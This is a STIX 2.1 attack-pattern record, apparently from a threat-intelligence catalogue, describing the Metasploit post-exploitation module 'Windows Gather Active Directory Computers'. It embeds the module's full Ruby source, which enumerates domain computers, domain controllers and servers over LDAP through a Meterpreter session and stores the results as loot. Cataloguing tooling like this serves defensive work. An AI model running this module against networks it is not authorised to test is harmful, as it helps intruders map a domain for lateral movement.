{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9e4356f-5a67-46f6-86be-6f6fd88e67f9",
    "created": "2024-08-14T16:33:05.021085Z",
    "modified": "2024-08-14T16:33:05.021088Z",
    "name": "Windows Gather Active Directory Computers",
    "description": " This module will enumerate computers in the default AD directory.  Optional Attributes to use in ATTRIBS: objectClass, cn, description, distinguishedName, instanceType, whenCreated whenChanged, uSNCreated, uSNChanged, name, objectGUID userAccountControl, badPwdCount, codePage, countryCode badPasswordTime, lastLogoff, lastLogon, localPolicyFlags pwdLastSet, primaryGroupID, objectSid, accountExpires logonCount, sAMAccountName, sAMAccountType, operatingSystem operatingSystemVersion, operatingSystemServicePack, serverReferenceBL dNSHostName, rIDSetPreferences, servicePrincipalName, objectCategory netbootSCPBL, isCriticalSystemObject, frsComputerReferenceBL lastLogonTimestamp, msDS-SupportedEncryptionTypes  ActiveDirectory has a MAX_SEARCH limit of 1000 by default. Split search up if you hit that limit.  Possible filters: (objectClass=computer) # All Computers (primaryGroupID=516)  # All Domain Controllers (&(objectCategory=computer)(operatingSystem=*server*)) # All Servers  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_ad_computers.rb",
            "external_id": "enum_ad_computers.rb"
        },
        {
            "source_name": "reference",
            "url": "http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::LDAP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'\t=> 'Windows Gather Active Directory Computers',\n        'Description' => %q{\n          This module will enumerate computers in the default AD directory.\n\n          Optional Attributes to use in ATTRIBS:\n          objectClass, cn, description, distinguishedName, instanceType, whenCreated,\n          whenChanged, uSNCreated, uSNChanged, name, objectGUID,\n          userAccountControl, badPwdCount, codePage, countryCode,\n          badPasswordTime, lastLogoff, lastLogon, localPolicyFlags,\n          pwdLastSet, primaryGroupID, objectSid, accountExpires,\n          logonCount, sAMAccountName, sAMAccountType, operatingSystem,\n          operatingSystemVersion, operatingSystemServicePack, serverReferenceBL,\n          dNSHostName, rIDSetPreferences, servicePrincipalName, objectCategory,\n          netbootSCPBL, isCriticalSystemObject, frsComputerReferenceBL,\n          lastLogonTimestamp, msDS-SupportedEncryptionTypes\n\n          ActiveDirectory has a MAX_SEARCH limit of 1000 by default. Split search up\n          if you hit that limit.\n\n          Possible filters:\n          (objectClass=computer) # All Computers\n          (primaryGroupID=516)  # All Domain Controllers\n          (&(objectCategory=computer)(operatingSystem=*server*)) # All Servers\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Ben Campbell' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          ['URL', 'http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx'],\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_net_resolve_hosts\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),\n      OptBool.new('STORE_DB', [true, 'Store file in DB (performance hit resolving IPs).', false]),\n      OptString.new('FIELDS', [true, 'FIELDS to retrieve.', 'dNSHostName,distinguishedName,description,operatingSystem,operatingSystemServicePack']),\n      OptString.new('FILTER', [true, 'Search filter.', '(&(objectCategory=computer)(operatingSystem=*server*))'])\n    ])\n  end\n\n  def run\n    fields = datastore['FIELDS'].gsub(/\\s+/, '').split(',')\n    search_filter = datastore['FILTER']\n    max_search = datastore['MAX_SEARCH']\n\n    begin\n      q = query(search_filter, max_search, fields)\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      print_error(e.message)\n      return\n    end\n\n    return if q.nil? || q[:results].empty?\n\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'Domain Computers',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => fields\n    )\n\n    # Hostnames holds DNS Names to Resolve\n    hostnames = []\n    # Reports are collections for easy database insertion\n    reports = []\n    q[:results].each do |result|\n      row = []\n\n      report = {}\n      0.upto(fields.length - 1) do |i|\n        field = result[i][:value] || ''\n\n        # Only perform these actions if the database is connected and we want\n        # to store in the DB.\n        if db && datastore['STORE_DB']\n          case fields[i]\n          when 'dNSHostName'\n            dns = field\n            report[:name] = dns\n            hostnames << dns\n          when 'operatingSystem'\n            report[:os_name] = field.gsub(\"\\xAE\", '')\n          when 'distinguishedName'\n            if field =~ /Domain Controllers/i\n              # TODO: Find another way to mark a host as being a domain controller\n              #       The 'purpose' field should be server, client, device, printer, etc\n              # report[:purpose] = \"DC\"\n              report[:purpose] = 'server'\n            end\n          when 'operatingSystemServicePack'\n            # XXX: Does this take into account the leading 'SP' string?\n\n            if field.to_i > 0\n              report[:os_sp] = 'SP' + field\n            end\n            if field =~ /(Service Pack|SP)\\s?(\\d+)/\n              report[:os_sp] = 'SP' + ::Regexp.last_match(2)\n            end\n\n          when 'description'\n            report[:info] = field\n          end\n        end\n\n        row << field\n      end\n\n      reports << report\n      results_table << row\n    end\n\n    if db && datastore['STORE_DB']\n      print_status('Resolving IP addresses...')\n      ip_results = client.net.resolve.resolve_hosts(hostnames, AF_INET)\n\n      # Merge resolved array with reports\n      reports.each do |report|\n        ip_results.each do |ip_result|\n          next unless ip_result[:hostname] == report[:name]\n\n          report[:host] = ip_result[:ip]\n          vprint_good(\"Database report: #{report.inspect}\")\n          report_host(report)\n        end\n      end\n    end\n\n    print_line results_table.to_s\n    if datastore['STORE_LOOT']\n      stored_path = store_loot('ad.computers', 'text/plain', session, results_table.to_csv)\n      print_good(\"Results saved to: #{stored_path}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}